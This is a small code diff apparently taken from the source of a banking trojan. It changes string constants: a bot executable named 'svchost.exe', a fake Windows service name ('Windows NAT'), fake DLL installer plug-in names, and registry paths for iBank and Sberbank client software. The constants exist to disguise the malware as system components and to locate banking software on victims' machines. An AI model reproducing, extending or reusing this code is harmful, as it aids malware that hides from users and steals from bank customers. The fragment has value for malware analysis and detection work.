@@ -65,7 +65,7 @@ CSSTR EStrBotServiceExeName[] = "svchost.exe";
 
 
 // Имя сервиса
-CSSTR EStrServiceName[] = "Windows NAT Server";
+CSSTR EStrServiceName[] = "Windows NAT";
 
 
 // Рабочии директории и файлы
@@ -134,7 +134,7 @@ CSSTR HTTPOctetStream[]            = "application/octet-stream";
 
 
 #ifdef FakeDllInstallerH
-	CSSTR EStrFakeDllInstallerCommandParams[] = "fakedllinstaller.plug bot.plug";
+	CSSTR EStrFakeDllInstallerCommandParams[] = "fdi.plug bot.plug";
 
 	CSSTR EStrIBankRegistryPath[] = "SOFTWARE\\Classes\\Installer\\Products\\7B00DF09E169B5445AD2F176D624114\\";
 	CSSTR EStrSberRegistryKey[]   = "SBRF\\";
